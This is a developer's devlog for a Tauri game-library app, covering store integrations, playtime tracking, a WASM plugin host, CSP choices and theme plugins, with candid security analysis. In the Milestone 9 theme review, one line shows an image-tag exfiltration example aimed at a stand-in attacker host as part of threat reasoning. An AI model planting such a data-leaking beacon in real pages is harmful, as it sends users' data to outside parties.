# Devlog

Detailed implementation history, rationale, and fixes behind every item in
`.claude/milestones.md`. Milestones.md tracks *what's done*; this tracks *why/how*. No
checkboxes here - this is a log, not a tracker. Same headings as milestones.md for
cross-reference.

## Milestone 7 — Polish & Extras
- List view for desktop UI (proposal calls for "grid and list views"; only grid existed before this)
- Metadata provider plugin support — swap IGDB for another source (proposal's "Other Plugin Candidates"); needed a new plugin `kind` (`"metadata"`) alongside `source`/`theme`, following the same manifest/loader pattern
- Controller mapping profile plugins — custom gamepad button/axis mappings, distinct from the previously-hardcoded `useGamepadNav` bindings (proposal's "Other Plugin Candidates")
- Background art on focus (Big Picture) — background art only; trailer preview stayed out of scope (proposal marks it "(stretch)" within an already-stretch item, and needs a separate trailer-source integration nothing here provides)
- Additional source plugins:
  - Epic Games — parses `%PROGRAMDATA%\Epic\EpicGamesLauncher\Data\Manifests\*.item` JSON (verified against Playnite's EpicLibrary source, since Epic doesn't document the format), launches via `com.epicgames.launcher://apps/{AppName}?action=launch&silent=true`. Verified end-to-end against a real Epic install (Fortnite): scan and launch both work. Required adding `{"identifier": "opener:allow-open-url", "allow": [{"url": "com.epicgames.launcher:*"}]}` to `capabilities/default.json` (same class of fix as the earlier Steam URI scope issue)
  - GOG — enumerates `HKLM\SOFTWARE\WOW6432Node\GOG.com\Games\{gameID}` (gameName/path values), launches via `GalaxyClient.exe /gameid {id} /command runGame` (verified against tkashkin/GOGWrapper source - GOG has no registered URI scheme, so this is a direct process spawn with args, not `openUrl()`). Pseudo-URI `gog://{gameId}` used in `executable_path` purely to route `launchGame()` to `invoke("launch_gog_game", ...)` instead of `openUrl()`. Verified end-to-end against a real GOG install: scan and launch both work
  - Emulator/ROM scanner — not yet done
- Big Picture scroll fixes: hid visible scrollbars in Big Picture mode (console-UI aesthetic, still scrollable via gamepad/keyboard `scrollIntoView`, just not visually shown), and stopped the underlying desktop page from scrolling along with it - Big Picture is a `position: fixed` overlay on top of `<main>`, but the desktop page behind it was still scrollable, so mouse-wheel input while Big Picture was open scrolled the hidden desktop content instead of staying scoped to the overlay. Fixed by locking the desktop page's scroll (e.g. `overflow: hidden` on `<body>`/`<html>`) while `bigPicture` is active, restored on close
- Auto-launch into Big Picture on boot (toggle)
- Per-game compatibility wrappers via [Locale Remulator](https://github.com/InWILL/Locale_Remulator) + [Locale Emulator](https://github.com/xupefei/Locale-Emulator) (both LGPL-3.0) — LR preferred as primary (LE is archived/32-bit-only), LE added as a fallback after real-world testing found a game LR couldn't get past its startup popup on (reproduced identically launching LR directly, no app involved - a genuine LR compatibility gap, not our integration) that LE ran fine
  - Plan revised twice: first from "bundle as a Tauri sidecar" (both need their own installer + GUI-created locale profiles, not a portable exe to bundle - same category as "assume Steam/GOG client is already installed"), then again after testing against real releases: both actually ship as portable folders (extract the zip anywhere), and their installers only register a right-click context-menu extension, not a discoverable app install - confirmed via registry inspection that neither writes an "App Paths"/Uninstall entry or dedicated key anywhere, so true auto-detection isn't possible for either
  - Global path settings in `AppSettings` for both (`appSettings.localeRemulatorPath`/`localeEmulatorPath`, mirrors the SGDB-API-key settings pattern), validated via the shared `locale_remulator.rs::wrapper_path_exists` — verified working against real extractions of both
  - `games.locale_profile_guid` + `games.locale_wrapper` (migrations v5/v6) — per-game opt-in via a GUID from `LRConfig.xml`/`LEConfig.xml` (same `Name`/`Guid` shape, LE is the project LR forked from), `locale_wrapper` (`"lr" | "le"`) disambiguates which tool the GUID belongs to since neither namespaces against the other. `EditGameModal` presents both profile lists in one `<select>`, split into `<optgroup>`s per wrapper
  - `launcher.rs::launch_via_locale_remulator` spawns `LRProc.exe <guid> <path>`; `locale_emulator.rs::launch_via_locale_emulator` spawns `LEProc.exe -runas <guid> <path>` (different CLI shape - LE needs the `-runas` flag before the guid, bare positional args run the target's own per-app profile instead)
  - Playtime fallback — neither wrapper's exit behavior after handing off to the hooked game is confirmed, so (like the URI-based sources) tracking falls back to `track_folder_playtime` using `install_dir` or the executable's parent folder
  - End-to-end verification — wrapper plumbing confirmed correct for both (`LRProc.exe`/`LEProc.exe` spawn, hook, and show the expected pre-game popup). The one test game hung past that popup under LR (both non-admin and admin profiles) but ran fine under LE; no code-side fix available for the LR gap short of the "build our own hook engine" approach already rejected as not worth the reverse-engineering/AV-risk cost
- Playtime tracking for URI-launched games (Steam/Epic/GOG) — implemented Playnite-style "Folder" tracking: `games.install_dir` (migration v4) records each entry's known install folder (Steam: `library_path/steamapps/common/<installdir>`, Epic: manifest `InstallLocation`, GOG: registry `path`). `launcher.rs::track_folder_playtime` (uses `sysinfo`) polls the running-process list every 3s, treats any process whose exe path falls under the normalized install folder as "the game is running", and emits the same `game-session-ended` event `launch_game` does once no matching process remains (2-poll grace period to survive launcher-to-game handoff; gives up quietly if nothing matches within 120s). `library.ts::launchGame` fires this after a URI-based launch whenever `install_dir` is known. Not Steam-specific - generalizes to any future protocol-launched source plugin. Verified end-to-end: a real play session gets recorded. Separately, historical playtime accumulated before this app was ever used could still be imported via Steam's `IPlayerService/GetOwnedGames` Web API (`playtime_forever`), tracked as a future stretch, not done

## Milestone 8 — Remote/Downloadable Plugins (future)
**Pivoted to WASM.** Original plan was a pasted-URL zip download containing a pre-built JS module, loaded via `convertFileSrc` + runtime `import()`. Investigating that surfaced a hard limit: Tauri compiles Rust `#[tauri::command]`s statically into the binary, so JS-bundle plugins can only *recombine already-existing* Tauri commands (e.g. `find_steam_apps`) - they can't introduce a genuinely new native capability without either (a) native dylib loading via `libloading`, which is unsandboxed arbitrary code execution at the OS level, far beyond the "same privilege as the app" risk already accepted for JS plugins, or (b) WebAssembly, which is what Zed does for its extensions: plugin code compiles to `.wasm`, runs in a real memory-sandboxed runtime embedded in the host, and can *only* call back into host functions the app explicitly exposes - genuine new-capability-per-plugin without the native-dylib risk. Chose (b).
- Embed a WASM runtime (`wasmtime`, Component Model) in `src-tauri`; define a WIT "world" per plugin kind, starting with `SourcePlugin` (`scan`/`launch`/`getInstallStatus`) — `wit/plugin.wit` defines the `host` import interface (registry/file/process/network primitives + scoped `settings`/`plugin-data` storage) and `source-plugin` export interface (mirrors the TS `SourcePlugin` contract); `wasm_plugins.rs` uses `wasmtime::component::bindgen!` to generate matching Rust bindings, confirmed compiling
- Host-function capability surface — generic primitives (registry read, file read/list, process spawn, HTTP fetch) exposed to WASM plugins. This is a deliberate shift: instead of writing a bespoke Rust module per integration (`steam.rs`, `gog.rs`, ...), a WASM plugin does its own VDF/XML/JSON parsing and composes these primitives itself. Implemented in `wasm_plugins.rs`'s `Host` impl: `read-registry-string` reuses the same `winreg` pattern as `steam.rs`/`gog.rs`; `spawn-process` is fire-and-forget like every other launcher path in this app; `http-get` uses `reqwest::blocking` rather than the async client used elsewhere (`sgdb.rs`/`igdb.rs`), since wasmtime component calls are synchronous - this must only ever run from a blocking context (e.g. `spawn_blocking`), never directly on the async runtime thread
- DB access stays host-owned, never raw SQL — no plugin gets direct access to `games`/`tags`/`playtime_sessions`; a malicious/buggy plugin could corrupt shared data, and hardcoded SQL against our schema would break on every migration (schema ownership is locked to versioned migrations in `db.rs` per `CLAUDE.md`). `scan()`/`fetchMetadata()` etc. return structured data, and the host's existing repository code (`GameRepository`, ...) does the actual writes, same as the TS plugins. Plugins that need to persist their own data get two scoped host functions instead of table access: `settings-get`/`settings-set` (existing generic `settings` table, key auto-prefixed with the plugin's own id via `PluginHostState::namespaced_settings_key`) and a new generic `plugin_data(plugin_id, game_id, key, value)` table (migration v7) with matching `plugin-data-get`/`plugin-data-set` functions. Implementation note: since `Host` trait methods run synchronously deep inside wasmtime execution with no path back to the frontend's async `tauri-plugin-sql` connection, `PluginHostState` opens its own Rust-side `rusqlite` connection to the same `library.db` file - multiple connections to one SQLite file is standard/safe, this doesn't change the app's frontend-owned DB architecture, it's purely how the host functions themselves reach the file
- Download command (paste a URL, matches the earlier UX decision) — `wasm_plugin_installer.rs::install_wasm_plugin` fetches a zip bundle (`plugin.json` + a `.wasm` entry, same shape as `src/plugins/<id>/plugin.json`) via `reqwest`, optionally verifies a pasted SHA256 (protects against a corrupted/tampered download, not against a malicious bundle - the SHA256 doesn't protect against trusting a bad source, see the plugin-privilege note below), extracts to a staging dir, reads the id out of `plugin.json`, then renames into `<app data>/wasm-plugins/<id>/`
- Tauri commands to load/instantiate a `.wasm` module against the host-function surface and invoke its exports; frontend calls through these rather than talking to plugin code directly — `wasm_plugin_runtime.rs`'s `wasm_plugin_scan`/`wasm_plugin_launch`/`wasm_plugin_get_install_status` mirror the three `SourcePlugin` methods, each instantiating the component fresh (cheap relative to how infrequently these run - user-triggered, not a hot path) inside `spawn_blocking`. `WasmGameEntry`/`WasmGameEntryInput` DTOs convert to/from the bindgen-generated `GameEntry` record rather than deriving `Serialize` on it directly, keeping the wire format decoupled from bindgen's derive support. The Component Model bindgen surface (`SourcePluginWorld::instantiate`, `gamelib_plugin_source_plugin()`, `call_scan`/`call_launch`/`call_get_install_status`) compiled correctly on the first pass
- Loader integration — the manifest/loader system recognizes a `"wasm"` entry alongside build-time TS entries, and presents it to stores/components as an ordinary `SourcePlugin` so existing call sites (`GameGrid`, `library.ts`) don't need to know the difference. `PluginManifest` gained an optional `runtime?: "ts" | "wasm"` field; `list_wasm_plugins` (Rust command in `wasm_plugin_installer.rs`) scans `<app data>/wasm-plugins/*/plugin.json` and returns them the same shape as build-time manifests. `loader.ts::getAvailablePluginManifests` became async (all 4 call sites - `plugins`/`theme`/`metadataProviders`/`controllerMapping` stores - already awaited it inside their own async `init()`, so this was a contained change) and merges installed WASM manifests alongside the Vite-discovered ones, restricted to `kind === "source"` since the WIT world only exports `SourcePlugin`. `loadPlugin` branches on `runtime === "wasm"` and returns a thin wrapper (`createWasmSourcePlugin`) whose `scan`/`launch`/`getInstallStatus` just call the `wasm_plugin_runtime.rs` Tauri commands - added `#[serde(rename_all = "camelCase")]` to the Rust-side `WasmGameEntry`/`WasmGameEntryInput` DTOs so their wire shape matches the TS `GameEntry` interface exactly, no manual field-name mapping needed either side
- Reference example — `examples/exe-scanner-plugin/` (standalone `cargo-component` crate, not part of the main workspace) implements `source-plugin-world`: `scan()` reads a `scan_dir` setting via `settings-get`, lists it via `list-dir`, filters `.exe` files; `launch()`/`getInstallStatus()` call `spawn-process`/`path-exists`. Required installing the `wasm32-wasip1` Rust target and `cargo-component` (neither present before this milestone). Building it against the WIT surfaced one real gap: `cargo-component`'s `wasm32-wasip1` target imports baseline `wasi:cli/*` interfaces even for a capability-less "reactor" component that never touches real WASI filesystem/env - fixed by also linking `wasmtime-wasi` with a bare, no-preopens `WasiCtx` (the guest still never gets real WASI access, only our own `host` interface). `wasm_plugin_runtime.rs::instantiate` was split into a Tauri-free `instantiate_from_paths` specifically so this could be a real `#[test]` - it loads the actual compiled `.wasm`, instantiates it, calls `scan()`, and asserts on real `GameEntry` results round-tripped across the component boundary. Test passes: `cargo test wasm_plugin_runtime` (from `src-tauri/`, after `cd examples/exe-scanner-plugin && cargo component build`)
- Revisited `tauri.conf.json` CSP (`csp: null` before) - simpler than the original plan's story, since this no longer involves loading remote JS/`import()` through the webview at all; WASM execution happens Rust-side via `wasmtime`. Set to `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src ipc: http://ipc.localhost`. Confirmed via grep that no frontend code calls `fetch`/`XMLHttpRequest`/`WebSocket` directly - every external API call (SteamGridDB, IGDB, wrapper/plugin downloads) happens server-side in Rust via `reqwest`, so `connect-src` only needs Tauri's own IPC channel, no external hosts. `img-src` allows `https:` broadly since cover/background art URLs are arbitrary external CDN URLs. `style-src` needs `'unsafe-inline'` for `BigPictureGrid.vue`'s dynamic `:style="{ backgroundImage: ... }"` binding. Verified in a running app (`bunx tauri dev`) - no CSP violations, cover art/background art/Big Picture backdrop all render correctly
- (Stretch) Migrate one existing built-in integration to a WASM plugin as a real-world proof — done for Steam
  - Genuinely separate repo (`steam-source-wasm-plugin`, local-only for now, sibling to this project on disk), not inside this one — a plugin whose source lives in the host app's own repo doesn't really exercise the "install arbitrary third-party code" model
  - Ported `steam.rs`'s VDF parsing/registry lookup/appmanifest scanning logic as-is (pure string/data parsing, no changes needed), every OS touchpoint swapped for the corresponding `host::` call
  - Installed manually into `<app data>/wasm-plugins/steam-wasm/` and scanned against a real Steam install — found the same games as the built-in plugin. Confirmed the whole pipeline (WIT contract, host functions, loader integration, install-by-copying-files) holds up for a real integration, not just the synthetic exe-scanner reference
  - Built-in `steam.rs`/`src/plugins/steam/index.ts` removed (and the now-unused `keyvalues-parser` dependency dropped from `src-tauri/Cargo.toml`) once the WASM version was confirmed working — the WASM plugin kept its `steam-wasm` id rather than renaming to `steam`, since renaming would silently desync anyone's already-persisted `enabled_plugins` setting
  - Migrating `games.install_dir`'s Steam usage into `plugin_data` — **won't-do**. `install_dir` is a shared, generic column every source plugin (Steam/Epic/GOG, WASM or TS) populates through the same path (`scan()` → `importEntries()` → `games.install_dir`), and `launchGame()`'s folder-based playtime tracking reads it back the same way regardless of which plugin produced the row - `steam-wasm` already participates in this correctly with zero special-casing. Migrating only Steam's slice into `plugin_data` would force `launchGame()` to special-case "if this game came from `steam-wasm`, look elsewhere" - reintroducing per-plugin awareness into the one place that's deliberately plugin-agnostic today, for no functional gain, and leaving Epic/GOG on the old column while Steam alone uses the new one. A uniform migration for *all* source plugins would be a coherent alternative but is real scope, not a small follow-up - tracked in Milestone 9 if ever wanted
- Install-by-URL, redesigned and finally wired to real UI - the original `install_wasm_plugin` (paste a zip URL, optional SHA256) was written this milestone but never actually called from the frontend; steam-source-wasm-plugin's own CI (added later, publishes `plugin.json` + the compiled `.wasm` as two plain sibling release assets, not a zip) made the old zip-shaped contract wrong anyway. Redesigned: `fetch_wasm_plugin_manifest(url)` fetches and parses just the manifest first; `install_wasm_plugin(app, manifest_url)` derives the sibling `.wasm` URL (same directory, filename = the manifest's own `entry` field) and downloads/writes both files - no zip, no checksum param (dropped the now-unused `sha2` dependency along with it). Frontend: `AddPluginModal.vue` (already generic, built earlier for the data-theme install-by-URL flow) reused unchanged for the Source tab's "Add Plugin" button; a new `ConfirmInstallModal.vue` shows the fetched id/name/version/kind and asks for confirmation before the actual `.wasm` download happens, wired into a new `plugins.ts` preview/confirm/cancel flow (`previewInstall` rejects non-`"source"`-kind manifests early)
- Real security gap found while designing that confirm dialog's warning copy - it's not accurate to call this "sandboxed" in any protective sense. Checked `wasm_plugins.rs`'s actual host-function implementations: `read-file`/`write-file`/`remove-dir`/`list-dir`/`path-exists`/`spawn-process`/`run-and-wait`/registry reads all take a caller-supplied path/executable with **zero scoping** - a plugin can read/write/delete anywhere the OS account can reach, or spawn any executable with any args. wasmtime's sandbox only guarantees memory-safety (can't corrupt host memory, can't escape linear memory) - it says nothing about what the *exposed host functions themselves* are allowed to do, and none of them are currently capability-restricted. Net: installing a WASM plugin from an untrusted URL today carries the same real-world risk as running an arbitrary downloaded `.exe` - the WASM boundary doesn't reduce that. Two real mitigations identified (see Milestone 13) - not implemented yet, so for now the confirm modal's copy was corrected to say so honestly instead of overclaiming protection, and the same caveat was added to the main README
- `wasm-plugins/` reorganized by kind - was a flat `<app data>/wasm-plugins/<id>/`, regardless of whether the plugin was a source or wrapper kind; now `<app data>/wasm-plugins/<kind>/<id>/`. `install_wasm_plugin` picks the subfolder from the manifest's own `kind` field, validated against a `SUPPORTED_KINDS` allowlist (`["source", "wrapper"]`, the only two WIT worlds that exist) first - `kind` is remote-controlled input that ends up as a path segment, so this also closes a path-traversal opening a crafted manifest could otherwise use. `list_wasm_plugins` scans each known kind subfolder instead of one flat directory. `wasm_plugin_runtime.rs`'s `plugin_dir()` gained a `kind` parameter, hardcoded per call site (`instantiate()` always resolves `source/`, `instantiate_wrapper()` always resolves `wrapper/`) rather than threaded from the frontend, since each Tauri command already only ever operates on one kind by construction. A real install from earlier testing (`wasm-plugins/steam-wasm/`, flat) was migrated by hand into the new `wasm-plugins/source/steam-wasm/` location rather than left to silently disappear from `list_wasm_plugins`'s output. Updated every WASM plugin repo's README install-path instructions and each repo's own copy of `wit/plugin.wit`'s `plugin-dir()` doc comment to match (doc-only in the WIT files - doesn't affect bindgen output, no rebuild needed on their end)

## Milestone 9 — Further WASM Adoption (stretch)
Natural follow-ups from Steam's real-world WASM migration, none required for anything else in this project - purely optional further adoption of the pattern now that it's proven end-to-end.
- Uniform `games.install_dir` → `plugin_data` migration for *all* source plugins — revisited and closed as **won't-do**, not just deferred. Two separate problems, not one: (1) `plugin_data` rows are namespaced by `plugin_id` and get cleaned up in one statement on uninstall (`db.rs`'s own doc comment on the table) - `install_dir` is core library metadata read back by `launchGame()`'s folder-based playtime tracking for every game regardless of which plugin (if any) sourced it, and a game row outlives the plugin that created it (uninstalling a source plugin never deletes the games it imported). Moving `install_dir` into `plugin_data` would silently break playtime tracking for already-imported games the moment their source plugin gets uninstalled - the opposite of what the current design guarantees. (2) Even setting that aside, `games` has no column recording which plugin produced a row (only a free-text `platform` string, not reliably 1:1 with a plugin id - e.g. built-in `steam` vs `steam-wasm`), so a uniform migration would first need to *add* a column just to know which `plugin_data` bucket to look in for a given game - net more moving parts for a lookup that costs zero special-casing today. `install_dir` stays a core `games` column
- Migrate GOG to a WASM plugin in its own separate repo (`gog-source-wasm-plugin`), same shape as `steam-source-wasm-plugin` — id `gog-wasm`, verified against a real GOG install (scan + launch both work). Needed one new host primitive Steam's port never required: `list-registry-keys` (enumerate registry *subkey names*), since GOG stores each installed game as its own subkey under `GOG.com\Games\`, unlike Steam's single named-value reads — added to the shared `wit/plugin.wit` host interface and `wasm_plugins.rs`, confirmed purely additive (the existing `exe-scanner-plugin` test still passes against the updated host)
  - Retired the built-in the same way Steam's was, once `gog-wasm` had been confirmed working against a real install (not just compiled): `src/plugins/gog/` (the TS `SourcePlugin`) deleted outright, `gog.rs` trimmed to just `launch_gog_game`. `find_gog_apps` (the scanning logic) is gone - fully redundant with `gog-wasm`'s registry scan - but `launch_gog_game` stays, since it's host-level dispatch `library.ts` calls directly for any `gog://`-prefixed `executable_path` regardless of which plugin scanned the game (GOG has no OS-registered URI scheme the way Steam/Epic do, so there's no `openUrl()` equivalent to fall back to). No `enabled_plugins` desync risk this time - the live settings already only had `gog-wasm` enabled, not the built-in `gog`, so nothing to migrate
  - Migrate Epic to a WASM plugin in its own separate repo (`epic-source-wasm-plugin`), same shape as Steam/GOG — id `epic-wasm`. Simpler port than GOG: Epic writes one `*.item` JSON manifest per installed game to `%PROGRAMDATA%\Epic\EpicGamesLauncher\Data\Manifests`, no registry involved at all, so no new host primitives were needed (`list-dir`/`read-file` already covered it). `%PROGRAMDATA%` is hardcoded to `C:\ProgramData` rather than read via an environment variable - a fixed Windows system directory not worth a new `env-var` host primitive for, same reasoning as Steam's own hardcoded install-path fallback. Epic's `launch()` is dead code same as Steam's, for the same reason: it has a real OS-registered URI scheme (`com.epicgames.launcher://`), so `library.ts`'s generic `openUrl()` dispatch handles it directly, never calling into either plugin's own `launch()`
    - Verification initially came in two parts, weaker than Steam/GOG's: the manifest-parsing logic is pure Rust (no `host::` calls), so it got its own `cargo test` suite using the exact real manifest field shape `epic.rs`'s own test already used (confirmed against Playnite's `EpicLibrary` source, same as the original built-in). The compiled component itself was verified to instantiate and `scan()`/`getInstallStatus()` cleanly against the real live `%PROGRAMDATA%` path - but at that point this machine had zero Epic games installed, so the real end-to-end check could only confirm "runs cleanly, finds nothing" rather than "finds the same real games as the built-in version," and `epic.rs`/`src/plugins/epic/` were left coexisting as a result
    - Closed the gap once a real game was available: installed a real game via Epic Games for exactly this purpose, re-ran the real end-to-end check, and this time `scan()` found it for real (its display name came back localized in Epic's Korean client, not English - the test asserts on the stable app-id-bearing URI rather than the title string for exactly this reason) with `getInstallStatus()` correctly reporting it installed. Built-in `epic.rs`/`src/plugins/epic/` retired immediately after, same as Steam/GOG - `epic.rs` deleted outright (no equivalent to GOG's `launch_gog_game` was ever needed, since Epic's real `com.epicgames.launcher://` URI scheme was always handled by `library.ts`'s generic `openUrl()` dispatch, nothing host-specific left over once scanning moved to the WASM plugin)
  - GOG's `gog.rs` retirement (above) initially kept `launch_gog_game` host-side, reasoning that GOG "has no OS-registered URI scheme the way Steam/Epic do." That turned out to be half-true: GOG Galaxy *does* register `goggalaxy://` (confirmed via a real registry check: `HKCU\Software\Classes\goggalaxy\shell\open\command` → `GalaxyClient.exe /urlProtocol="%1"`, set up by GOG Galaxy's own installer, same mechanism as Steam/Epic). But its game-launch argument grammar isn't publicly documented anywhere, and a known community reference implementation (`GOGWrapper`) doesn't use it to launch a specific game either - it uses the same direct `/gameid <id> /command runGame` CLI form this project already relies on. Switching to the URI would mean trading a confirmed-working mechanism for an unverified one, for no real benefit, so it wasn't pursued
    - What *did* change: `gog-wasm`'s `launch()` was dead code (like Steam/Epic's) only because `library.ts` bypassed it entirely in favor of a dedicated `launch_gog_game` Tauri command. Made it real instead - `gog-wasm`'s `launch()` now resolves `GalaxyClient.exe`'s path via the registry itself (mirroring `gog.rs`'s now-removed `gog_galaxy_client_dir_from_registry`) and spawns it directly via `host::spawn-process`, no new host primitives needed. `library.ts`'s `"gog://"` branch now calls `invoke("wasm_plugin_launch", { pluginId: "gog-wasm", entry })` (reconstructing a `GameEntry` from the DB row) instead of the dedicated command - `gog.rs` is now fully empty and was deleted outright, same end state as `steam.rs`. Verified for real: scanned a real installed GOG game, called `launch()`, confirmed `GalaxyClient.exe` (plus its helper processes) actually started - not just "no error returned"
- **External theme plugins, data-only tier.** `ThemePlugin` already splits cleanly into two capability tiers: `cssVariables` (a flat string map, pure data) and `slots` (real Vue component overrides for `GameCard`/`BigPictureTile`). The `slots` tier can't ever be externalized - a WASM component can only export typed data/functions, never a renderable Vue component, same wall `Installable` hit for settings UI. The `cssVariables` tier has no such problem: it's just data, so it doesn't even need WASM/wasmtime - no code to sandbox at all. New `data_theme_installer.rs`: `install_data_theme(url)` downloads a JSON manifest (`{id, name, version, cssVariables}`) from a user-pasted URL and caches it at `<app data>/data-themes/<id>/theme.json`, `list_data_themes()`/`uninstall_data_theme(id)` round it out - no checksum/size check the way binary installs get, since the worst case here is a bad CSS value, not code execution
  - `manifest.ts`'s `runtime` union gained a third value, `"data"`, alongside `"ts"`/`"wasm"` - and `PluginManifest` gained an optional `cssVariables` field, since a data-theme manifest carries its entire content inline (no separate compiled/bundled entry to load). `loader.ts` gained `getInstalledDataThemeManifests()` (parallel to `getInstalledWasmManifests`, merged into `getAvailablePluginManifests`) and a `createDataThemePlugin()` factory that's nearly trivial - the manifest already has everything a `ThemePlugin` needs, no separate invoke required per instance the way WASM plugins need one call per method
  - `theme.ts` gained `installDataTheme(url)`/`uninstallDataTheme(id)`, and `PluginSettings.vue`'s Theme tab gained a URL input + Install button (below the theme list) plus a per-row "Remove" button for any `runtime: "data"` entry. Uninstalling the currently-active theme falls back to the default (`catppuccin-latte`) rather than leaving the app on a theme that no longer exists
  - `install_data_theme_to`/`list_data_themes_from`/`uninstall_data_theme_from` were split out `AppHandle`-free (same pattern as `wasm_plugin_runtime.rs`'s `instantiate_from_paths`) specifically so the happy path could be a real test rather than a compiles-clean check. Since there's no long-lived external resource to hit the way GitHub's API is for the wrapper/WASM-plugin installers, the test spins up its own single-request HTTP/1.1 responder on an OS-assigned localhost port (hand-rolled over `std::net::TcpListener`, no new dependency) - a real `reqwest` HTTP round-trip against a real (if minimal) server, not a mocked response, while staying fully self-contained and reproducible without any manual setup or network access
  - **Component-override tier (`slots`) reviewed, found blocked.** Re-checked whether the reasoning above ("can't ever be externalized") still held, given how much the plugin system had grown since it was first written - it does, and worse than expected. Two candidate mechanisms:
    - **WASM export** - still structurally impossible, not just impractical. The Component Model can only cross typed functions/data (numbers, strings, records) over the host-guest boundary; a Vue component is a live object graph (render function, reactive `setup()`, lifecycle hooks) that has no representation on that boundary at all. No new WIT primitive or world design closes this - it's the same category of wall `Installable`-for-WASM already hit for settings UI, just for component rendering instead of config collection.
    - **Raw remote JS instead, bypassing WASM entirely** - this was in fact the *original* Milestone 8 plan before the pivot to WASM, and the reason for that pivot (`#[tauri::command]`s compile statically, so a JS-bundle plugin could only recombine capabilities the host already exposes, never add a new one) doesn't really bite here, since a theme component only renders `game` prop data it's already handed - no new native capability needed. But the security profile is a regression, not a wash: no memory-safety sandbox at all (same JS realm as the whole app, not an isolated one), full access to every already-exposed Tauri command rather than a narrow `host::` surface, and direct read/write access to every Pinia store in memory. The current CSP's `connect-src` lockdown (`ipc: http://ipc.localhost` only) would block a naive `fetch`-based exfil, but `img-src` still allows arbitrary `https:` - an `<img src="https://attacker.com/leak?data=...">` still works as a channel out even under today's CSP.
    - Verdict: closing this out as reviewed-and-blocked rather than leaving it open-ended. Pursuing the JS-bundle route now would mean shipping a *less* constrained install-by-URL tier while the WASM one's own capability-sandboxing gap (Milestone 13) is still unresolved - a bigger regression, not a smaller one.
    - **Moved to Milestone 17 (Post-1.0 Roadmap).** The blocking condition named above - Milestone 13's sandboxing gap being open - no longer holds; both Milestone 13 and 14 have since closed. Rather than silently leave a stale "blocked" verdict sitting inside an otherwise fully-closed Milestone 9, split it out as its own tracked Post-1.0 item so the now-outdated premise gets revisited on its own rather than assumed to still apply.
    - **Revisited the "genuinely safe alternative" against a real precedent.** Playnite - a mature, established app solving the exact same problem in this exact product category - was checked for how it handles theme customization deeper than plain color/CSS values. Its answer: themes are `.xaml` files (WPF's declarative UI markup), parsed and rendered by WPF's own engine, never compiled/executable code - confirms the earlier "constrained declarative card template" idea isn't a hypothetical, it's the pattern mature game-library-manager theme systems actually converge on once CSS alone isn't enough. Sharper framing than originally noted: this doesn't need to be built from scratch as "a small template engine" - Vue itself already ships a runtime template compiler (`@vue/compiler-sfc`/full-build Vue) that compiles a plain *string* of Vue template syntax into a render function at runtime, no `import()` of arbitrary JS involved at all. That's Concourse's direct equivalent of XAML, already available in a dependency already in use. The real remaining design work if this is ever pursued is scope, not tooling - the compiled template's expression scope would need to be tightly whitelisted to `game` fields plus known formatting helpers, not the ambient app context, since unrestricted `{{ }}` interpolation can still call whatever's in scope. Still not proposed for implementation now - this only upgrades the alternative from speculative to concretely buildable with tooling already on hand, it doesn't reopen the "blocked" verdict for the existing `slots` tier itself
    - **Scope note on what "importing Vue" for this would actually mean**, since it's not obvious upfront. `@vitejs/plugin-vue` precompiles every `.vue` file at build time (`@vue/compiler-sfc` runs in Node, never ships to the browser), so the app currently only bundles Vue's *runtime* (reactivity + renderer + `h`) - nothing needs to compile a template string post-build today. Runtime-compiling a theme-provided template string would need exactly one missing piece added: `@vue/compiler-dom`'s `compile()`. Not a second Vue instance - Vue's packages (`reactivity`/`runtime-core`/`runtime-dom`/`compiler-dom`) are modules of one versioned whole, so adding `compiler-dom` just plugs the missing piece into the runtime already loaded, same `h`/component model/reactivity, no duplication, as long as the version matches exactly. Should be lazy (`import('@vue/compiler-dom')` only when a plugin actually declares a template override, code-split out of the main bundle), not bundled unconditionally for users who never install one. Also worth being precise about, not overclaiming: `{{ }}` interpolations aren't inert data placeholders once compiled - they're real evaluated JS expressions against whatever's exposed on the render context. Not equivalent to raw JS `import()` (no arbitrary statements, no module loading, no reaching `window`/`document` unless explicitly put in scope), but not zero-JS-execution either - the actual security property comes entirely from how tightly that exposed scope gets whitelisted, not from the compiler mechanism itself
- Rename `steam-wasm` → `steam` cleanly, if ever wanted, including a one-time migration for anyone's already-persisted `enabled_plugins` setting so it doesn't silently desync (not done as part of the initial migration - see Milestone 8's note) - **resolved differently.** Revisited once every WASM plugin (not just Steam) had accumulated the same cosmetic issue: `plugin.json`'s `name` field still said "Steam (WASM)"/"GOG (WASM)"/etc., a suffix that only ever meant "disambiguate from the coexisting built-in during migration/comparison" - now meaningless since every built-in (`steam.rs`, `gog.rs`, `epic.rs`, `sgdb.rs`, `igdb.rs`) is fully retired, and LR/LE never had one to begin with. Explicitly chose *not* to touch `id` (`steam-wasm`, `gog-wasm`, etc. all stay as-is) - that's the part with real migration risk (`enabled_plugins`/`active_theme_id`-style persisted settings reference ids, not names), and nothing about the display text needed it. Dropped "(WASM)" from `name` across all 7 plugin repos (`steam-source-wasm-plugin`, `gog-source-wasm-plugin`, `epic-source-wasm-plugin`, `sgdb-metadata-wasm-plugin`, `igdb-metadata-wasm-plugin`, `locale-remulator-wasm-plugin`, `locale-emulator-wasm-plugin`), bumped each to `0.1.1` (patch - cosmetic manifest field, no behavior/compatibility change) in both `plugin.json` and `Cargo.toml`. `.wasm` binaries themselves untouched (manifest is read from disk separately, never embedded in the compiled component), so no rebuild was needed - just re-verified each repo's `Cargo.toml` still parses (`cargo check`) and every edited `plugin.json` is still valid JSON
- **SteamGridDB/IGDB migrated to WASM plugins.** Both needed real new infrastructure first, not just a port - unlike Steam/GOG/Epic (which already fit `SourcePlugin` cleanly), these surfaced two genuine gaps:
  - **HTTP capability gap.** The existing `http-get: func(url: string) -> result<string, string>` has no way to send custom headers or a non-GET method - SteamGridDB needs `Authorization: Bearer <key>`, IGDB needs a Twitch OAuth POST plus a POST-based query API with a `Client-ID` header and a raw Apicalypse body. Added a general `http-request(method, url, headers: list<tuple<string, string>>, body: option<string>)` primitive rather than narrow single-purpose functions - `headers` uses a plain tuple list instead of a named record specifically to avoid the "bindgen only generates record types a world's exports reference" issue that already forced two independent `bindgen!` invocations for `source-plugin-world`/`wrapper-plugin-world`. `do_http_request` in `wasm_plugins.rs` still sends the same default `User-Agent: concourse` base header, overridable per-call since `reqwest` takes the last `.header()` call for a given name
